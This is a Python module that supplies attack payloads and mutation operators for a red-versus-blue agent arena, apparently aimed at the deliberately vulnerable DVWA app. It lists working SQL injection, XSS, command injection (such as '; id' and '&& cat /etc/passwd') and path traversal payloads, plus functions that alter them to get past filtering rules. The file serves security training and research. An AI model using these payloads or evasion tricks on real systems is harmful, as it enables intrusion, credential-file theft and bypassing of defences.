"""Attack payload library + mutation operators for CyberRanger Arena.

This is the raw material the evolving Red agent draws from. Payloads are
grouped by vulnerability category; each maps to a DVWA endpoint in dvwa_env.py.
Mutators produce evasive variants so Red can adapt when Blue learns a rule.
"""

import random

# Base exploits per category. Deliberately real DVWA-low payloads.
BASE_PAYLOADS = {
    "sqli": [
        "1' OR '1'='1",
        "1' UNION SELECT user,password FROM users -- -",
        "1' OR 1=1 -- -",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ],
    "cmdi": [
        "-c 1 127.0.0.1; id",
        "-c 1 127.0.0.1 | id",
        "-c 1 127.0.0.1 && cat /etc/passwd",
    ],
    "traversal": [
        "../../../../etc/passwd",
        "/etc/passwd",
        "....//....//....//etc/passwd",
    ],
}

BENIGN = [
    "127.0.0.1",
    "hello world",
    "John Smith",
    "8.8.8.8",
]

CATEGORIES = list(BASE_PAYLOADS.keys())

# Alternate keyword vectors Red can pivot to when a rule blocks the obvious one.
_SQLI_ALTS = ["OR", "||", "UNION", "SELECT", "SLEEP(0)", "AND"]
_XSS_ALTS = ["<script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
             "<body onload=alert(1)>", "<iframe onload=alert(1)>"]
# Only separators that cleanly terminate the ping first — avoids the target
# becoming a bogus hostname that makes ping do a slow (~3s) DNS lookup and
# starves DVWA's Apache worker, which would slow every following request.
_CMDI_SEPS = [";", "|", "&&"]


def _case_flip(s):
    """Randomly upper/lower each letter — evades case-sensitive literal rules."""
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)


def _comment_inject(s):
    """Insert SQL inline comments inside keywords: UNION -> UN/**/ION."""
    for kw in ["UNION", "SELECT", "OR", "AND"]:
        if kw.lower() in s.lower() and len(kw) > 1:
            mid = kw[: len(kw) // 2] + "/**/" + kw[len(kw) // 2:]
            return _replace_ci(s, kw, mid)
    return s + "/**/"


def _replace_ci(haystack, needle, repl):
    """Case-insensitive single replace."""
    low = haystack.lower()
    i = low.find(needle.lower())
    if i < 0:
        return haystack
    return haystack[:i] + repl + haystack[i + len(needle):]


def _url_encode_quotes(s):
    """Percent-encode quotes/slashes — evades rules keyed on raw chars."""
    return s.replace("'", "%27").replace("/", "%2f")


def _pivot_vector(s, category):
    """Swap to a different attack vector in the same category."""
    if category == "sqli":
        return s.replace("OR", random.choice(_SQLI_ALTS)) + " -- -"
    if category == "xss":
        return random.choice(_XSS_ALTS)
    if category == "cmdi":
        return "-c 1 127.0.0.1" + random.choice(_CMDI_SEPS) + "id"
    if category == "traversal":
        depth = random.choice(["../", "..%2f", "....//"])
        return depth * random.randint(3, 6) + "etc/passwd"
    return s


_OP_LABELS = {
    id(_case_flip): "case-flip",
    id(_comment_inject): "comment-injection",
    id(_url_encode_quotes): "url-encoding",
    id(_pivot_vector): "vector-pivot",
}

_OPERATORS = {
    "sqli": [_case_flip, _comment_inject, _url_encode_quotes, _pivot_vector],
    "xss": [_case_flip, _pivot_vector, _url_encode_quotes],
    "cmdi": [_pivot_vector, _case_flip],
    "traversal": [_pivot_vector, _url_encode_quotes],
}


def mutate(payload, category):
    """Return (evasive_variant, technique_label) for `payload`.

    This is the Red-side seam for evolution: a real system would use an LLM
    or a learned policy to propose mutations instead of these hand-written ops.
    """
    ops = _OPERATORS.get(category, [_case_flip])
    op = random.choice(ops)
    try:
        variant = op(payload, category) if op is _pivot_vector else op(payload)
    except TypeError:
        variant = op(payload)
    return (variant or payload), _OP_LABELS.get(id(op), "mutation")
